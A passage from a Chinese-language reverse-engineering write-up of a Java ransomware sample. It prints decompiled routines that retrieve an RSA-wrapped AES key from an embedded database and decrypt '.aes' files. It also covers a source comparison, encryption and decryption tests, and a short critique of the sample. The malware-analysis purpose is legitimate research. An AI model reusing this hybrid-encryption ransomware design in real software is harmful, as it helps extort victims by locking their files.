+<pre><code>public static TreeMap&lt;String, HashMap&lt;String, String&gt;&gt; Deserialize(final InputStream stream) throws Exception {
+    final ObjectInputStream ois = new ObjectInputStream(stream);
+    final Object obj = ois.readObject();
+    final ObjectMapper oMapper = new ObjectMapper();
+    final TreeMap&lt;String, HashMap&lt;String, String&gt;&gt; Map = (TreeMap&lt;String, HashMap&lt;String, String&gt;&gt;)oMapper.&lt;TreeMap&lt;String, HashMap&lt;String, String&gt;&gt;&gt;convertValue(obj, (Class&lt;TreeMap&lt;String, HashMap&lt;String, String&gt;&gt;&gt;)TreeMap.class);
+    return Map;
+}
+</code></pre><p>这样一来，就将数据库里的数据转为map对象了</p>
+<p>初始化迭代器</p>
+<pre><code>final Set set = containsFilters.entrySet();
+final Iterator iterator = set.iterator();
+</code></pre><p>初始化key</p>
+<pre><code>final SecretKeySpec aesKey = CryptoRansomware.RetrieveAesKey(privKey);
+</code></pre><p>前面把AES加密的时候先是使用了<code>Base64</code>哈希，在RSA加密，再<code>Base64</code>哈希</p>
+<pre><code>public static SecretKeySpec RetrieveAesKey(final String privKey) throws SQLException, GeneralSecurityException {
+    final String EncryptedAesKey = EmbeddedDatabase.SelectKeyFromTable();
+    return Decrypt(RsaKeyReader.loadPrivateKey(privKey), EncryptedAesKey);
+}
+</code></pre><p>这里先从数据库中获取各种加密哈希之后的AES秘钥</p>
+<pre><code>public static String SelectKeyFromTable() throws SQLException {
+    PreparedStatement preparedStatement = null;
+    String value = &quot;&quot;;
+    final String selectSQL = &quot;SELECT EncryptedKey FROM RansomTable &quot;;
+    try {
+        preparedStatement = EmbeddedDatabase.conn.prepareStatement(selectSQL);
+        final ResultSet rs = preparedStatement.executeQuery();
+        if (rs.next()) {
+            value = rs.getString(&quot;EncryptedKey&quot;);
+            return value;
+        }
+        return value;
+    }
+    catch (SQLException e) {
+        System.out.println(e.getMessage());
+    }
+    catch (Exception e2) {
+        return value;
+    }
+    finally {
+        if (preparedStatement != null) {
+            preparedStatement.close();
+        }
+    }
+    return value;
+}
+</code></pre><p>RSA私钥的初始化，因为私钥进行了<code>Base64</code>哈希，所以需要先还原</p>
+<pre><code>public static PrivateKey loadPrivateKey(final String key64) throws GeneralSecurityException {
+    final byte[] clear = Base64.decodeBase64(key64);
+    final PKCS8EncodedKeySpec keySpec = new PKCS8EncodedKeySpec(clear);
+    final KeyFactory fact = KeyFactory.getInstance(&quot;RSA&quot;);
+    final PrivateKey priv = fact.generatePrivate(keySpec);
+    Arrays.fill(clear, (byte)0);
+    return priv;
+}
+</code></pre><p>AES秘钥先<code>Base64</code>还原，再RSA解密，再<code>Base64</code>还原</p>
+<pre><code>public static SecretKeySpec Decrypt(final PrivateKey privateKey, final String cipherText) {
+    SecretKeySpec aeskeyspec = null;
+    try {
+        final byte[] plainBytes = Base64.decodeBase64(cipherText.getBytes(&quot;UTF-8&quot;));
+        final Cipher cipher = Cipher.getInstance(&quot;RSA&quot;);
+        cipher.init(2, privateKey);
+        final byte[] decrypteed = cipher.doFinal(plainBytes);
+        final String DecryptedString = new String(decrypteed, &quot;UTF-8&quot;);
+        final byte[] decodedKey = Base64.decodeBase64(DecryptedString);
+        aeskeyspec = new SecretKeySpec(decodedKey, 0, decodedKey.length, &quot;AES&quot;);
+        return aeskeyspec;
+    }
+    catch (NoSuchAlgorithmException e) {
+        e.printStackTrace();
+    }
+    catch (NoSuchPaddingException e2) {
+        e2.printStackTrace();
+    }
+    catch (BadPaddingException e3) {
+        e3.printStackTrace();
+    }
+    catch (UnsupportedEncodingException e4) {
+        e4.printStackTrace();
+    }
+    catch (IllegalBlockSizeException e5) {
+        e5.printStackTrace();
+    }
+    catch (InvalidKeyException e6) {
+        e6.printStackTrace();
+    }
+    return aeskeyspec;
+}
+</code></pre><p>迭代解密</p>
+<pre><code>while (iterator.hasNext()) {
+    final Map.Entry mentry = (Map.Entry)iterator.next();
+    final Object obj = mentry.getValue();
+    final ObjectMapper oMapper = new ObjectMapper();
+    final HashMap&lt;String, String&gt; Map = (HashMap&lt;String, String&gt;)oMapper.&lt;HashMap&lt;String, String&gt;&gt;convertValue(obj, (Class&lt;HashMap&lt;String, String&gt;&gt;)HashMap.class);
+    final Set mapset = Map.entrySet();
+    for (final Map.Entry entry : mapset) {
+        final File filein = new File(entry.getKey() + &quot;.&quot; + entry.getValue());
+        final File fileout = new File(entry.getKey() + &quot;.aes&quot;);
+        CryptoRansomware.DecryptFile(fileout, filein, aesKey);
+    }
+}
+</code></pre><p>解密的具体代码，最终会删除已解密的加密文件，并输出已解密的文件路径</p>
+<pre><code>public static void DecryptFile(final File in, final File out, final SecretKeySpec aeskeySpec) {
+    try {
+        final Cipher aesCipher = Cipher.getInstance(&quot;AES/CFB8/NoPadding&quot;);
+        aesCipher.init(2, aeskeySpec, new IvParameterSpec(CryptoRansomware.ivBytes));
+        final CipherInputStream is = new CipherInputStream(new FileInputStream(in), aesCipher);
+        final FileOutputStream os = new FileOutputStream(out);
+        copy(is, os);
+        is.close();
+        os.close();
+    }
+    catch (IOException ex) {
+        ex.printStackTrace();
+    }
+    catch (NoSuchPaddingException e) {
+        e.printStackTrace();
+    }
+    catch (NoSuchAlgorithmException e2) {
+        e2.printStackTrace();
+    }
+    catch (InvalidAlgorithmParameterException e3) {
+        e3.printStackTrace();
+    }
+    catch (InvalidKeyException e4) {
+        e4.printStackTrace();
+    }
+    final boolean bool = in.delete();
+    System.out.println(&quot;File deleted: &quot; + bool);
+}
+</code></pre><p>那么整个样本的逆向分析到这里就已经结束了，接下来我们对照一下源码对比一下关键的地方</p>
+<h2 id="0x02-">0x02 源码对比</h2>
+<p>导入IDEA</p>
+<p>前面说的第一处问题，其实反编译器直接标注出来也方便分析<br><img src="Image/8.png" alt=""></p>
+<p>第二处，逆向的时候这里还分了两个<code>switch</code>，直接700+行<br><img src="Image/9.png" alt=""></p>
+<p>这个地方一开始我觉得可能会有跨平台的问题，后面实验发现并没有</p>
+<p><img src="Image/10.png" alt=""></p>
+<h2 id="0x03-">0x03 测试</h2>
+<p>加密</p>
+<p><img src="Image/11.png" alt=""></p>
+<p>加密完的效果，源文件被删除，后缀变成<code>.aes</code>，注意<code>Successfully removed cryptography restrictions</code>，既然走到这个分支，说明获取到的是<code>Java(TM) SE Runtime Environment</code></p>
+<p><img src="Image/12.png" alt=""></p>
+<p>解密</p>
+<p><img src="Image/13.png" alt=""></p>
+<p>我们来实验一下获取<code>Java(TM) SE Runtime Environment</code></p>
+<p><img src="Image/14.png" alt=""></p>
+<h2 id="0x04-">0x04 小结</h2>
+<p>作者使用的加密组合其实是一个哲学问题，RSA加密速度快，解密非常慢，AES加解密速度都能接受，所以使用AES加密文件，使用RSA来加密AES的秘钥，其中使用了不少Java 8的新特性，能搜到的资料并不多，看Java源码看得眼泪都要掉下来了，代码写的很漂亮，三观正，而且有些地方写的是真的好，很值得我这种菜鸟学习</p>
+<p>有些地方也有不足：</p>
+<ul>
+<li>比如没有考虑没有后缀文件的情况，Linux下就会漏掉不少文件</li></ul>
+<h2 id="0x05-references">0x05 References</h2>
+<ul>
+<li>Unsupported major.minor version 52.0 [duplicate]: <a href="http://stackoverflow.com/questions/22489398/unsupported-major-minor-version-52-0">http://stackoverflow.com/questions/22489398/unsupported-major-minor-version-52-0</a></li><li>获得程序当前路径System.getProperty(&quot;user.dir&quot;): <a href="http://blog.csdn.net/zhuhuiby/article/details/8569516">http://blog.csdn.net/zhuhuiby/article/details/8569516</a></li><li>What is a “regular file” in Java?: <a href="http://stackoverflow.com/questions/20547268/what-is-a-regular-file-in-java">http://stackoverflow.com/questions/20547268/what-is-a-regular-file-in-java</a></li><li>What is a regular file?: <a href="http://unix.stackexchange.com/questions/99276/what-is-a-regular-file">http://unix.stackexchange.com/questions/99276/what-is-a-regular-file</a></li><li>Map.EntrySet的用法: <a href="http://blog.csdn.net/nuoshueihe/article/details/7874069">http://blog.csdn.net/nuoshueihe/article/details/7874069</a></li><li>JDK 8u102 changed JceSecurity#isRestricted to final: <a href="https://github.com/jruby/jruby/issues/4101">https://github.com/jruby/jruby/issues/4101</a></li><li>derby教程使用总结及心得: <a href="http://blog.csdn.net/winter13292/article/details/25543779">http://blog.csdn.net/winter13292/article/details/25543779</a></li></ul>
+
+</body>
+</html>
+<!-- This document was created with MarkdownPad, the Markdown editor for Windows (http://markdownpad.com) -->
